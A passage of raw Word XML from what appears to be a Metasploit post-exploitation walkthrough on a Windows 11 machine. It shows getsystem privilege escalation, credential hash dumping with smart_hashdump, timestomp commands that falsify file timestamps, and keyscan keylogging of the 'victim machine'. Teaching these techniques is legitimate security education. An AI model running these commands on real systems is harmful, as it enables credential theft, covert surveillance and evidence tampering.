          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018D">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9"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red"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="35" name="image30.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image30.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId76"/>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red"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="90"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">So we can see that we have gor C:\windows\system32&gt;WHICH IS AN ADMINISTRATOR ACCESS AND WE HAVE GOT ALL THE SENSITIVE INFORMATION ABOUT THE WINDOWS 11 MACHINE.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000018F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000190">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29"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE can do getsystem -t 1 and this time we have got access without failed operation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000192">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000193">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="24"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE HAVE DONE THE command run post/windows/gather/smart_hashdump AND WE CAN SEE THE HASHED VALUE OF ALL THE USER/ADMINISTRATOR credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000195">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000196">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Now we can do a bunch of privilege escalation techniques to get more information:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000197">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000198">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">1.to modify the MACE[modified,accessed,created,entry] ATTRIBUTES:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000199">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">COMMAND:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">timestomp [file name] -v</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can see all the MACE attributes of that specific file</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000019E">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41"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We have filtered out the text file named ThirdPartyNoticesBySHS.txt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A0">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A1">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will see the MACE attribute of that text file</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A2">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">timestomp  [file name] -v</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A4">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A5">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To modilfy the command will be</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">timestomp  [file name] -m </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">timestomp  [file name] -a</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001A9">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">timestomp [file name] -c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001AA">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">timestomp [file name] -e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001AB">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001AC">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">For modified “-m” , for accesses “-a” , for created “-c” and </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001AD">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">For entry it is “-e”.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001AE">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001AF">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW we can check all the “KEYBOARD STROKES” done by the user in the victim machine:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B0">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B1">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: keyscan_start</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B2">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then keyscan_dump</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B3">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B4">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Before that we will be writing a text file in our target machine to check whether the output of those commands are accurate or not.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B5">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B6">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">First we will type keyscan_start</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B7">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001B8">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
